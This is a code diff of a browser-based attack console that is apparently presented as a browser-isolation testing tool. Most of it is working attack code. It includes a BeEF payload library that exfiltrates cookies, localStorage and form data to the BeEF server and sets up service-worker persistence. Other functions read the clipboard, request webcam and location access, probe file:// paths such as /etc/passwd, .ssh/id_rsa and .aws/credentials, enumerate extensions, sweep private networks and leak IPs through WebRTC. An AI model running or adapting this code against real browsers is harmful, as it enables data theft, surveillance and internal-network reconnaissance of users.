+                                const ports = [80, 443, 8080, 22, 21, 25];
+                                
+                                targets.forEach(target => {
+                                    ports.forEach(port => {
+                                        beef.net.port_scanner(target, port, 1000);
+                                    });
+                                });
+                                
+                                log('beef', '🔍 Port scanning initiated via BeEF', 'success');
+                                return true;
+                            } catch (error) {
+                                log('beef', `Port scanning failed: ${error.message}`, 'error');
+                                return false;
+                            }
+                        }
+                        return false;
+                    }
+                },
+                {
+                    name: 'Webcam Access',
+                    exec: () => {
+                        try {
+                            navigator.mediaDevices.getUserMedia({ video: true })
+                                .then(stream => {
+                                    log('beef', '🚨 Webcam access granted!', 'critical');
+                                    successfulAttacks++;
+                                    stream.getTracks().forEach(track => track.stop());
+                                    updateStats();
+                                })
+                                .catch(error => {
+                                    log('beef', `Webcam access denied: ${error.message}`, 'warning');
+                                });
+                            return true;
+                        } catch (error) {
+                            log('beef', `Webcam test failed: ${error.message}`, 'error');
+                            return false;
+                        }
+                    }
+                },
+                {
+                    name: 'Geolocation Access',
+                    exec: () => {
+                        try {
+                            navigator.geolocation.getCurrentPosition(
+                                position => {
+                                    log('beef', `🚨 Location accessed: ${position.coords.latitude}, ${position.coords.longitude}`, 'critical');
+                                    successfulAttacks++;
+                                    updateStats();
+                                },
+                                error => {
+                                    log('beef', `Geolocation denied: ${error.message}`, 'warning');
+                                }
+                            );
+                            return true;
+                        } catch (error) {
+                            log('beef', `Geolocation test failed: ${error.message}`, 'error');
+                            return false;
+                        }
+                    }
+                },
+                {
+                    name: 'Clipboard Access',
+                    exec: () => {
+                        try {
+                            if (navigator.clipboard) {
+                                navigator.clipboard.readText()
+                                    .then(text => {
+                                        log('beef', `🚨 Clipboard content read: ${text.substring(0, 100)}...`, 'critical');
+                                        successfulAttacks++;
+                                        updateStats();
+                                    })
+                                    .catch(error => {
+                                        log('beef', `Clipboard access denied: ${error.message}`, 'warning');
+                                    });
+                                
+                                navigator.clipboard.writeText('BeEF clipboard test - ' + Date.now())
+                                    .then(() => {
+                                        log('beef', '🚨 Clipboard write successful!', 'critical');
+                                        successfulAttacks++;
+                                        updateStats();
+                                    })
+                                    .catch(error => {
+                                        log('beef', `Clipboard write denied: ${error.message}`, 'warning');
+                                    });
+                                return true;
+                            }
+                            return false;
+                        } catch (error) {
+                            log('beef', `Clipboard test failed: ${error.message}`, 'error');
+                            return false;
+                        }
+                    }
+                }
+            ];
+            
+            // Execute each command with delay
+            commands.forEach((command, index) => {
+                setTimeout(() => {
+                    log('beef', `Executing: ${command.name}`, 'info');
+                    try {
+                        const result = command.exec();
+                        if (result) {
+                            log('beef', `✅ ${command.name} executed successfully`, 'success');
+                        } else {
+                            log('beef', `❌ ${command.name} failed to execute`, 'error');
+                        }
+                    } catch (error) {
+                        log('beef', `${command.name} error: ${error.message}`, 'error');
+                    }
+                }, index * 1000);
+            });
+            
+            updateStats();
+            log('beef', 'BeEF command execution initiated', 'success');
+        }
+        
+        function loadBeEFPayloads() {
+            log('beef', '📦 Loading BeEF payload library...', 'info');
+            
+            const payloads = `
+// BeEF Integration Payloads for Browser Isolation Testing
+
+// 1. Advanced Browser Fingerprinting
+function beefBrowserFingerprint() {
+    if (typeof beef !== 'undefined') {
+        const fingerprint = {
+            browser: beef.browser.getBrowserName() + ' ' + beef.browser.getBrowserVersion(),
+            platform: beef.browser.getBrowserPlatform(),
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            cookiesEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : null
+        };
+        
+        console.log('BeEF Browser Fingerprint:', fingerprint);
+        
+        // Send to BeEF if available
+        if (beef.net && beef.net.send) {
+            beef.net.send('/fingerprint', JSON.stringify(fingerprint));
+        }
+        
+        return fingerprint;
+    }
+    return null;
+}
+
+// 2. Internal Network Discovery via BeEF
+function beefNetworkDiscovery() {
+    if (typeof beef !== 'undefined' && beef.net) {
+        const localRanges = [
+            '192.168.1.1-255',
+            '192.168.0.1-255', 
+            '10.0.0.1-255',
+            '172.16.0.1-255'
+        ];
+        
+        localRanges.forEach(range => {
+            const [baseRange, endRange] = range.split('-');
+            const baseIP = baseRange.substring(0, baseRange.lastIndexOf('.') + 1);
+            const endNum = parseInt(endRange);
+            
+            for (let i = 1; i <= Math.min(endNum, 20); i++) {
+                const targetIP = baseIP + i;
+                setTimeout(() => {
+                    beef.net.port_scanner(targetIP, 80, 1000);
+                    beef.net.port_scanner(targetIP, 443, 1000);
+                    beef.net.port_scanner(targetIP, 8080, 1000);
+                }, i * 100);
+            }
+        });
+        
+        console.log('BeEF network discovery initiated');
+        return true;
+    }
+    return false;
+}
+
+// 3. Persistence via BeEF
+function beefEstablishPersistence() {
+    if (typeof beef !== 'undefined') {
+        // Service Worker persistence
+        if ('serviceWorker' in navigator) {
+            const swCode = \`
+                self.addEventListener('fetch', event => {
+                    if (event.request.url.includes('beef-persist')) {
+                        event.respondWith(
+                            fetch('${beefHookUrl}').then(response => response.text())
+                            .then(hookCode => new Response(hookCode, {
+                                headers: { 'Content-Type': 'application/javascript' }
+                            }))
+                        );
+                    }
+                });
+            \`;
+            
+            navigator.serviceWorker.register(
+                'data:application/javascript,' + encodeURIComponent(swCode)
+            ).then(() => {
+                console.log('BeEF persistence via Service Worker established');
+            }).catch(err => {
+                console.log('Service Worker persistence failed:', err);
+            });
+        }
+        
+        // LocalStorage persistence
+        try {
+            localStorage.setItem('beef_persistence', JSON.stringify({
+                hookUrl: beefHookUrl,
+                timestamp: Date.now(),
+                sessionId: beef.session ? beef.session.get_hook_session_id() : null
+            }));
+            console.log('BeEF persistence via localStorage established');
+        } catch (e) {
+            console.log('localStorage persistence failed:', e);
+        }
+        
+        return true;
+    }
+    return false;
+}
+
+// 4. Data Exfiltration via BeEF
+function beefDataExfiltration() {
+    if (typeof beef !== 'undefined' && beef.net) {
+        const sensitiveData = {
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            location: window.location.href,
+            formData: Array.from(document.querySelectorAll('input')).map(input => ({
+                name: input.name,
+                type: input.type,
+                value: input.type === 'password' ? '[REDACTED]' : input.value
+            }))
+        };
+        
+        // Exfiltrate via BeEF
+        try {
+            beef.net.send('/exfiltrate', JSON.stringify(sensitiveData));
+            console.log('Data exfiltrated via BeEF');
+            return true;
+        } catch (error) {
+            console.log('BeEF exfiltration failed:', error);
+            return false;
+        }
+    }
+    return false;
+}
+
+// 5. Browser Isolation Escape Tests
+function beefIsolationEscapeTests() {
+    const tests = [
+        {
+            name: 'File System Access',
+            test: () => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.webkitdirectory = true;
+                return input.webkitdirectory === true;
+            }
+        },
+        {
+            name: 'Window Object Access',
+            test: () => {
+                try {
+                    return window.parent !== window;
+                } catch (e) {
+                    return false;
+                }
+            }
+        },
+        {
+            name: 'Chrome Extension API',
+            test: () => {
+                return typeof chrome !== 'undefined' && chrome.runtime;
+            }
+        },
+        {
+            name: 'Node.js Detection',
+            test: () => {
+                return typeof process !== 'undefined' && process.versions && process.versions.node;
+            }
+        },
+        {
+            name: 'Electron Detection',
+            test: () => {
+                return typeof window !== 'undefined' && window.process && window.process.type;
+            }
+        }
+    ];
+    
+    const results = tests.map(test => ({
+        name: test.name,
+        result: test.test(),
+        timestamp: Date.now()
+    }));
+    
+    console.log('BeEF Isolation Escape Test Results:', results);
+    
+    // Send results via BeEF
+    if (typeof beef !== 'undefined' && beef.net) {
+        beef.net.send('/escape-tests', JSON.stringify(results));
+    }
+    
+    return results;
+}
+
+// Execute payload functions
+console.log('BeEF Payload Library Loaded');
+console.log('Available functions:');
+console.log('- beefBrowserFingerprint()');
+console.log('- beefNetworkDiscovery()'); 
+console.log('- beefEstablishPersistence()');
+console.log('- beefDataExfiltration()');
+console.log('- beefIsolationEscapeTests()');
+            `;
+            
+            document.getElementById('custom-js').value = payloads;
+            log('beef', '✅ BeEF payload library loaded into custom JS area', 'success');
+            log('beef', 'Execute the payload functions from the custom JS section', 'info');
+        }
+        
+        function openBeEFPanel() {
+            const panelUrl = document.getElementById('beef-panel-url').value.trim();
+            
+            if (!panelUrl) {
+                log('beef', 'Please enter BeEF panel URL first', 'error');
+                return;
+            }
+            
+            try {
+                window.open(panelUrl, '_blank', 'width=1200,height=800,scrollbars=yes,resizable=yes');
+                log('beef', `🎛️ BeEF control panel opened: ${panelUrl}`, 'success');
+            } catch (error) {
+                log('beef', `Failed to open BeEF panel: ${error.message}`, 'error');
+            }
+        }
+        
+        function unhookBeEF() {
+            if (!beefHooked) {
+                log('beef', 'Browser is not currently hooked to BeEF', 'info');
+                return;
+            }
+            
+            try {
+                // Remove BeEF script
+                const beefScript = document.getElementById('beef-hook-script');
+                if (beefScript) {
+                    beefScript.remove();
+                }
+                
+                // Clear BeEF global object if possible
+                if (typeof beef !== 'undefined') {
+                    delete window.beef;
+                }
+                
+                beefHooked = false;
+                beefHookUrl = '';
+                
+                log('beef', '🔓 Browser unhooked from BeEF', 'warning');
+                updateStats();
+                
+            } catch (error) {
+                log('beef', `Error unhooking from BeEF: ${error.message}`, 'error');
+            }
+        }
+
+        // Browser Abuse Functions
+        async function testExtensionAccess() {
+            log('browser', '🔍 Starting browser extension enumeration...', 'critical');
+            escapeAttempts++;
+            browserTestCount++;
+            
+            // Test common extension protocols
+            const commonExtensions = [
+                'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/', // AdBlock
+                'chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/', // uBlock Origin
+                'chrome-extension://bhlhnicpbhignkljdhlakddgfx91mmgq/', // ColorZilla
+                'moz-extension://', // Firefox extensions
+                'safari-extension://', // Safari extensions
+            ];
+            
+            for (const ext of commonExtensions) {
+                try {
+                    const response = await fetch(ext + 'manifest.json', {
+                        method: 'GET',
+                        mode: 'cors'
+                    });
+                    
+                    if (response.ok) {
+                        const manifest = await response.text();
+                        log('browser', `🚨 Extension found: ${ext}`, 'critical');
+                        log('browser', `Manifest: ${manifest.substring(0, 200)}...`, 'info');
+                        successfulAttacks++;
+                    }
+                } catch (error) {
+                    // Extension not accessible
+                }
+            }
+            
+            // Test extension API access
+            try {
+                if (typeof chrome !== 'undefined' && chrome.runtime) {
+                    log('browser', '🚨 Chrome runtime API accessible!', 'critical');
+                    
+                    if (chrome.tabs) {
+                        log('browser', '🚨 Chrome tabs API accessible!', 'critical');
+                        successfulAttacks++;
+                    }
+                    
+                    if (chrome.storage) {
+                        log('browser', '🚨 Chrome storage API accessible!', 'critical');
+                        successfulAttacks++;
+                    }
+                }
+            } catch (error) {
+                log('browser', 'Chrome extension APIs not accessible', 'info');
+            }
+            
+            updateStats();
+            log('browser', 'Extension enumeration completed', 'success');
+        }
+
+        async function testConfigModification() {
+            log('browser', '⚙️ Testing browser configuration modification...', 'critical');
+            escapeAttempts++;
+            browserTestCount++;
+            
+            // Test localStorage/sessionStorage access
+            try {
+                localStorage.setItem('escape_test', 'success');
+                const testValue = localStorage.getItem('escape_test');
+                if (testValue === 'success') {
+                    log('browser', '🚨 localStorage write/read successful!', 'critical');
+                    successfulAttacks++;
+                }
+                localStorage.removeItem('escape_test');
+            } catch (error) {
+                log('browser', 'localStorage access blocked', 'warning');
+            }
+            
+            // Test cookie access
+            try {
+                document.cookie = 'escape_test=success; path=/';
+                if (document.cookie.includes('escape_test=success')) {
+                    log('browser', '🚨 Cookie write access successful!', 'critical');
+                    successfulAttacks++;
+                }
+            } catch (error) {
+                log('browser', 'Cookie access blocked', 'warning');
+            }
+            
+            // Test history manipulation
+            try {
+                history.pushState({test: 'escape'}, 'Test', '/escape-test');
+                log('browser', '🚨 History manipulation successful!', 'critical');
+                successfulAttacks++;
+                history.back();
+            } catch (error) {
+                log('browser', 'History manipulation blocked', 'warning');
+            }
+            
+            updateStats();
+            log('browser', 'Configuration modification tests completed', 'success');
+        }
+
+        async function testLocalFileAccess() {
+            log('browser', '📁 Testing local file access...', 'warning');
+            escapeAttempts++;
+            browserTestCount++;
+            
+            const localFilePaths = [
+                'file:///etc/passwd',
+                'file:///etc/hosts',
+                'file:///Windows/System32/drivers/etc/hosts',
+                'file:///Users/',
+                'file:///home/',
+                'file:///.aws/credentials',
+                'file:///.ssh/id_rsa'
+            ];
+            
+            for (const path of localFilePaths) {
+                try {
+                    const response = await fetch(path);
+                    if (response.ok) {
+                        const content = await response.text();
+                        log('browser', `🚨 File access successful: ${path}`, 'critical');
+                        log('browser', `Content preview: ${content.substring(0, 100)}...`, 'info');
+                        successfulAttacks++;
+                    }
+                } catch (error) {
+                    // File not accessible - expected in most cases
+                }
+            }
+            
+            // Test file input element
+            try {
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.webkitdirectory = true;
+                
+                if (fileInput.webkitdirectory) {
+                    log('browser', '🚨 Directory access input available!', 'critical');
+                    successfulAttacks++;
+                }
+            } catch (error) {
+                log('browser', 'File input access limited', 'info');
+            }
+            
+            updateStats();
+            log('browser', 'Local file access tests completed', 'success');
+        }
+
+        async function testLocalStorage() {
+            log('browser', '💾 Testing local storage abuse...', 'warning');
+            escapeAttempts++;
+            browserTestCount++;
+            
+            // Test various storage mechanisms
+            const storageTests = [
+                { name: 'localStorage', obj: window.localStorage },
+                { name: 'sessionStorage', obj: window.sessionStorage },
+            ];
+            
+            for (const storage of storageTests) {
+                try {
+                    if (storage.obj) {
+                        // Try to read existing data
+                        const keys = Object.keys(storage.obj);
+                        if (keys.length > 0) {
+                            log('browser', `🚨 ${storage.name} contains data: ${keys.length} keys`, 'critical');
+                            keys.slice(0, 5).forEach(key => {
+                                const value = storage.obj.getItem(key);
+                                log('browser', `  ${key}: ${value ? value.substring(0, 50) : 'null'}...`, 'info');
+                            });
+                            successfulAttacks++;
+                        }
+                        
+                        // Try to write test data
+                        storage.obj.setItem('escape_persistence_test', JSON.stringify({
+                            timestamp: Date.now(),
+                            userAgent: navigator.userAgent,
+                            origin: window.location.origin
+                        }));
+                        
+                        log('browser', `✅ ${storage.name} write access confirmed`, 'success');
+                    }
+                } catch (error) {
+                    log('browser', `${storage.name} access denied: ${error.message}`, 'warning');
+                }
+            }
+            
+            // Test IndexedDB
+            try {
+                const request = indexedDB.open('EscapeTestDB', 1);
+                request.onsuccess = function(event) {
+                    log('browser', '🚨 IndexedDB access successful!', 'critical');
+                    successfulAttacks++;
+                    updateStats();
+                };
+                request.onerror = function(event) {
+                    log('browser', 'IndexedDB access blocked', 'warning');
+                };
+            } catch (error) {
+                log('browser', 'IndexedDB not available', 'info');
+            }
+            
+            updateStats();
+            log('browser', 'Local storage abuse tests completed', 'success');
+        }
+
+        function executeCustomJS() {
+            log('javascript', '⚡ Executing custom JavaScript...', 'critical');
+            escapeAttempts++;
+            
+            const customCode = document.getElementById('custom-js').value;
+            if (!customCode.trim()) {
+                log('javascript', 'No custom JavaScript provided', 'warning');
+                return;
+            }
+            
+            try {
+                // Create a new function to isolate execution
+                const executeCode = new Function('log', 'successfulAttacks', 'updateStats', customCode);
+                executeCode(
+                    (msg, type) => log('javascript', msg, type),
+                    successfulAttacks,
+                    updateStats
+                );
+                
+                log('javascript', '✅ Custom JavaScript executed successfully', 'success');
+                successfulAttacks++;
+                
+            } catch (error) {
+                log('javascript', `❌ Execution failed: ${error.message}`, 'error');
+                log('javascript', `Stack trace: ${error.stack}`, 'info');
+            }
+            
+            updateStats();
+        }
+
+        function loadJSPayloads() {
+            const payloads = `// Browser Information Gathering
+console.log('User Agent:', navigator.userAgent);
+console.log('Platform:', navigator.platform);
+console.log('Languages:', navigator.languages);
+console.log('Cookies Enabled:', navigator.cookieEnabled);
+console.log('Online Status:', navigator.onLine);
+
+// Attempt to access browser internals
+try {
+    console.log('Chrome:', typeof chrome);
+    console.log('Safari:', typeof safari);
+    console.log('Firefox:', typeof InstallTrigger);
+} catch(e) { console.log('Browser detection error:', e.message); }
+
+// Network information (if available)
+try {
+    if (navigator.connection) {
+        console.log('Connection:', navigator.connection);
+    }
+} catch(e) { console.log('Connection info error:', e.message); }
+
+// Geolocation attempt
+try {
+    navigator.geolocation.getCurrentPosition(
+        pos => console.log('Location:', pos.coords),
+        err => console.log('Location error:', err.message)
+    );
+} catch(e) { console.log('Geolocation error:', e.message); }
+
+// WebRTC IP discovery
+try {
+    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = event => {
+        if (event.candidate) {
+            console.log('WebRTC IP discovered:', event.candidate.candidate);
+        }
+    };
+} catch(e) { console.log('WebRTC error:', e.message); }`;
+
+            document.getElementById('custom-js').value = payloads;
+            log('javascript', 'Payload library loaded', 'success');
+        }
+
+        // Network Enumeration Functions
+        async function enumerateLocalHosts() {
+            log('network', '🕸️ Starting local host enumeration...', 'critical');
+            escapeAttempts++;
+            
+            const localRanges = [
+                '192.168.1.',
+                '192.168.0.',
+                '10.0.0.',
+                '172.16.0.',
+                '127.0.0.'
+            ];
+            
+            let discoveredHosts = 0;
+            
+            for (const range of localRanges) {
+                for (let i = 1; i <= 20; i++) { // Test first 20 IPs in each range
+                    const ip = range + i;
+                    
+                    try {
+                        const startTime = Date.now();
+                        const response = await fetch(`http://${ip}`, {
+                            method: 'HEAD',
+                            mode: 'no-cors',
+                            signal: AbortSignal.timeout(1000)
+                        });
+                        
+                        const responseTime = Date.now() - startTime;
+                        log('network', `✅ Host discovered: ${ip} (${responseTime}ms)`, 'success');
+                        discoveredHosts++;
+                        
+                        // Add to targets if not already present
+                        if (!targets.find(t => t.host === ip)) {
+                            targets.push({
+                                host: ip,
+                                port: '',
+                                service: 'discovered',
+                                status: 'accessible'
+                            });
+                        }
+                        
+                    } catch (error) {
+                        // Host not responding - normal behavior
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 50)); // Rate limiting
+                }
+            }
+            
+            if (discoveredHosts > 0) {
+                successfulAttacks++;
+                updateTargetList();
+            }
+            
+            updateStats();
+            log('network', `Host enumeration completed. Found ${discoveredHosts} responsive hosts`, 'success');
+        }
+
+        async function testInternalAssets() {
+            log('network', '🎯 Testing access to internal assets...', 'critical');
+            escapeAttempts++;
+            
+            let accessibleCount = 0;
+            const totalTargets = targets.length;
+            
+            for (let i = 0; i < targets.length; i++) {
+                const target = targets[i];
+                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
+                
+                try {
+                    const protocols = ['http', 'https'];
+                    
+                    for (const protocol of protocols) {
+                        try {
+                            const startTime = Date.now();
+                            const response = await fetch(`${protocol}://${fullTarget}`, {
+                                method: 'HEAD',
+                                mode: 'no-cors',
+                                signal: AbortSignal.timeout(3000)
+                            });
+                            
+                            const responseTime = Date.now() - startTime;
+                            target.status = 'accessible';
+                            log('network', `✅ ${fullTarget} accessible via ${protocol.toUpperCase()} (${responseTime}ms)`, 'success');
+                            accessibleCount++;
+                            break; // Success with one protocol is enough
+                            
+                        } catch (protocolError) {
+                            // Try next protocol
+                        }
+                    }
+                    
+                    if (target.status === 'unknown') {
+                        target.status = 'blocked';
+                    }
+                    
+                } catch (error) {
+                    target.status = 'error';
+                    log('network', `❌ ${fullTarget} - Error: ${error.message}`, 'error');
+                }
+                
+                updateProgress(i + 1, totalTargets);
                 await new Promise(resolve => setTimeout(resolve, 100)); // Rate limiting
+            }
+            
+            if (accessibleCount > 0) {
+                successfulAttacks++;
             }
             
             updateTargetList();
             updateStats();
-            log('connectivity', 'Basic connectivity tests completed', 'success');
+            log('network', `Internal asset testing completed. ${accessibleCount}/${totalTargets} targets accessible`, 'success');
         }
 
-        async function testHTTPAccess() {
-            log('http', 'Testing HTTP access methods...', 'info');
+        async function portScanTargets() {
+            log('network', '🔍 Performing port scanning on targets...', 'warning');
+            escapeAttempts++;
             
-            for (const target of targets) {
+            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9000];
+            
+            for (const target of targets.slice(0, 10)) { // Limit to first 10 targets
                 if (target.status === 'blocked') continue;
                 
-                window.currentTarget = target.url;
+                log('network', `Scanning ports for ${target.host}...`, 'info');
+                let openPorts = [];
                 
-                try {
-                    // Test different HTTP methods
-                    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD'];
-                    const results = {};
-                    
-                    for (const method of methods) {
-                        try {
-                            const response = await fetch(`http://${target.url}`, {
-                                method: method,
-                                mode: 'cors',
-                                signal: AbortSignal.timeout(3000)
-                            });
-                            
-                            results[method] = {
-                                status: response.status,
-                                accessible: true
-                            };
-                            
-                            log('http', `✅ ${target.url} - ${method} (${response.status})`, 'success');
-                            
-                        } catch (error) {
-                            results[method] = {
-                                accessible: false,
-                                error: error.message
-                            };
-                        }
-                    }
-                    
-                    target.results.httpMethods = results;
-                    
-                } catch (error) {
-                    log('http', `❌ ${target.url} - HTTP test failed: ${error.message}`, 'error');
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-            
-            log('http', 'HTTP access testing completed', 'success');
-        }
-
-        async function testHTTPSAccess() {
-            log('http', 'Testing HTTPS access...', 'info');
-            
-            for (const target of targets) {
-                if (target.status === 'blocked') continue;
-                
-                window.currentTarget = target.url;
-                
-                try {
-                    const response = await fetch(`https://${target.url}`, {
-                        method: 'GET',
-                        mode: 'cors',
-                        signal: AbortSignal.timeout(5000)
-                    });
-                    
-                    target.results.https = {
-                        accessible: true,
-                        status: response.status,
-                        headers: Object.fromEntries(response.headers.entries())
-                    };
-                    
-                    log('http', `✅ ${target.url} - HTTPS accessible (${response.status})`, 'success');
-                    
-                } catch (error) {
-                    target.results.https = {
-                        accessible: false,
-                        error: error.message
-                    };
-                    
-                    log('http', `❌ ${target.url} - HTTPS failed: ${error.message}`, 'error');
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-            
-            log('http', 'HTTPS access testing completed', 'success');
-        }
-
-        async function discoverServices() {
-            log('discovery', 'Starting service discovery...', 'info');
-            
-            const commonPaths = [
-                '/', '/admin', '/api', '/login', '/dashboard', '/status', '/health',
-                '/robots.txt', '/sitemap.xml', '/.well-known/', '/favicon.ico',
-                '/wp-admin', '/phpmyadmin', '/admin.php', '/administrator',
-                '/api/v1', '/api/v2', '/rest', '/graphql', '/swagger',
-                '/management', '/actuator', '/metrics', '/debug'
-            ];
-            
-            for (const target of targets) {
-                if (target.status === 'blocked') continue;
-                
-                window.currentTarget = target.url;
-                const discoveredPaths = [];
-                
-                for (const path of commonPaths) {
+                for (const port of commonPorts) {
                     try {
-                        const response = await fetch(`http://${target.url}${path}`, {
+                        const response = await fetch(`http://${target.host}:${port}`, {
                             method: 'HEAD',
                             mode: 'no-cors',
-                            signal: AbortSignal.timeout(2000)
+                            signal: AbortSignal.timeout(1000)
                         });
                         
-                        discoveredPaths.push({
-                            path: path,
-                            accessible: true,
-                            status: response.status
-                        });
-                        
-                        log('discovery', `✅ ${target.url}${path} - Found`, 'success');
+                        openPorts.push(port);
+                        log('network', `  Port ${port} open on ${target.host}`, 'success');
                         
                     } catch (error) {
-                        // Path not accessible - normal behavior
+                        // Port closed or filtered
                     }
-                    
-                    await new Promise(resolve => setTimeout(resolve, 50));
                 }
                 
-                target.results.discoveredPaths = discoveredPaths;
-                
-                if (discoveredPaths.length > 0) {
-                    log('discovery', `${target.url} - Found ${discoveredPaths.length} accessible paths`, 'success');
+                if (openPorts.length > 0) {
+                    log('network', `${target.host} has ${openPorts.length} open ports: ${openPorts.join(', ')}`, 'success');
+                    successfulAttacks++;
+                } else {
+                    log('network', `No open ports found on ${target.host}`, 'info');
                 }
+                
+                await new Promise(resolve => setTimeout(resolve, 200));
             }
             
-            log('discovery', 'Service discovery completed', 'success');
+            updateStats();
+            log('network', 'Port scanning completed', 'success');
         }
 
-        async function testWebSocketConnections() {
-            log('advanced', 'Testing WebSocket connections...', 'info');
+        async function testNetworkProtocols() {
+            log('network', '🌐 Testing various network protocols...', 'info');
+            escapeAttempts++;
             
-            for (const target of targets) {
-                if (target.status === 'blocked') continue;
-                
-                window.currentTarget = target.url;
-                
+            const protocolTests = [
+                { name: 'HTTP', test: () => fetch('http://httpbin.org/ip', {signal: AbortSignal.timeout(3000)}) },
+                { name: 'HTTPS', test: () => fetch('https://httpbin.org/ip', {signal: AbortSignal.timeout(3000)}) },
+                { name: 'WebSocket', test: () => new Promise((resolve, reject) => {
+                    const ws = new WebSocket('ws://echo.websocket.org');
+                    ws.onopen = () => { ws.close(); resolve('success'); };
+                    ws.onerror = reject;
+                    setTimeout(() => reject(new Error('timeout')), 3000);
+                })},
+                { name: 'WebRTC', test: () => new Promise((resolve, reject) => {
+                    const pc = new RTCPeerConnection();
+                    pc.createOffer().then(() => resolve('success')).catch(reject);
+                })}
+            ];
+            
+            for (const protocol of protocolTests) {
                 try {
-                    const ws = new WebSocket(`ws://${target.url}`);
-                    
-                    ws.onopen = function() {
-                        log('advanced', `✅ ${target.url} - WebSocket connection opened`, 'success');
-                        target.results.websocket = { accessible: true };
-                        ws.close();
-                    };
-                    
-                    ws.onerror = function(error) {
-                        log('advanced', `❌ ${target.url} - WebSocket connection failed`, 'error');
-                        target.results.websocket = { accessible: false };
-                    };
-                    
-                    // Try secure WebSocket
-                    setTimeout(() => {
-                        try {
-                            const wss = new WebSocket(`wss://${target.url}`);
-                            wss.onopen = function() {
-                                log('advanced', `✅ ${target.url} - Secure WebSocket connection opened`, 'success');
-                                target.results.websocketSecure = { accessible: true };
-                                wss.close();
-                            };
-                            wss.onerror = function() {
-                                target.results.websocketSecure = { accessible: false };
-                            };
-                        } catch (e) {
-                            // WSS not supported
-                        }
-                    }, 1000);
-                    
+                    await protocol.test();
+                    log('network', `✅ ${protocol.name} protocol accessible`, 'success');
+                    successfulAttacks++;
                 } catch (error) {
-                    log('advanced', `❌ ${target.url} - WebSocket test failed: ${error.message}`, 'error');
+                    log('network', `❌ ${protocol.name} protocol blocked: ${error.message}`, 'warning');
                 }
-                
-                await new Promise(resolve => setTimeout(resolve, 1500));
             }
             
-            log('advanced', 'WebSocket testing completed', 'success');
+            updateStats();
+            log('network', 'Protocol testing completed', 'success');
         }
 
-        async function establishBeacon() {
-            log('exfiltration', 'Establishing beacon connections...', 'critical');
+        // Advanced Escape Functions
+        async function testWebRTCEscape() {
+            log('escape', '📡 Testing WebRTC IP disclosure...', 'critical');
+            escapeAttempts++;
             
-            for (const target of targets) {
-                if (target.status !== 'accessible') continue;
-                
-                window.currentTarget = target.url;
-                
-                try {
-                    // Test HTTP POST beacon
-                    const beaconData = {
-                        timestamp: Date.now(),
-                        source: 'isolation-scanner',
-                        target: target.url,
-                        userAgent: navigator.userAgent,
-                        referrer: document.referrer
-                    };
-                    
-                    const response = await fetch(`http://${target.url}/beacon`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(beaconData),
-                        signal: AbortSignal.timeout(3000)
-                    });
-                    
-                    if (response.ok) {
-                        log('exfiltration', `🚨 ${target.url} - Beacon established successfully`, 'critical');
-                        target.results.beacon = { established: true, method: 'HTTP POST' };
-                    }
-                    
-                } catch (error) {
-                    // Try GET beacon
-                    try {
-                        const params = new URLSearchParams({
-                            beacon: 'true',
-                            timestamp: Date.now(),
-                            source: 'isolation-scanner'
-                        });
-                        
-                        await fetch(`http://${target.url}?${params}`, {
-                            method: 'GET',
-                            mode: 'no-cors',
-                            signal: AbortSignal.timeout(3000)
-                        });
-                        
-                        log('exfiltration', `🚨 ${target.url} - GET beacon sent`, 'warning');
-                        target.results.beacon = { established: true, method: 'HTTP GET' };
-                        
-                    } catch (getError) {
-                        log('exfiltration', `❌ ${target.url} - Beacon failed: ${error.message}`, 'error');
-                    }
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-            
-            log('exfiltration', 'Beacon establishment completed', 'success');
-        }
-
-        async function generateDirectLinks() {
-            log('links', 'Generating direct access links...', 'info');
-            
-            const linkContainer = document.getElementById('links-output');
-            linkContainer.innerHTML += '\n🔗 DIRECT ACCESS LINKS:\n';
-            
-            targets.forEach(target => {
-                if (target.status === 'accessible' || target.status === 'partial') {
-                    const protocols = ['http', 'https'];
-                    const commonPaths = ['/', '/admin', '/api', '/login', '/dashboard'];
-                    
-                    protocols.forEach(protocol => {
-                        commonPaths.forEach(path => {
-                            const link = `${protocol}://${target.url}${path}`;
-                            linkContainer.innerHTML += `<a href="${link}" target="_blank" style="color: #4dabf7; margin-right: 10px;">${link}</a>\n`;
-                        });
-                    });
-                }
-            });
-            
-            log('links', `Generated direct links for ${targets.filter(t => t.status === 'accessible').length} accessible targets`, 'success');
-        }
-
-        async function runAllTests() {
-            log('results', '🚀 Starting comprehensive testing suite...', 'critical');
-            
-            totalTests = targets.length * 8; // Approximate number of tests per target
-            completedTests = 0;
-            updateProgress();
-            
-            // Run tests in sequence
-            await testBasicConnectivity();
-            await testHTTPAccess();
-            await testHTTPSAccess();
-            await discoverServices();
-            await testWebSocketConnections();
-            await establishBeacon();
-            
-            generateDirectLinks();
-            generateReport();
-            
-            log('results', '✅ All tests completed!', 'success');
-        }
-
-        function generateReport() {
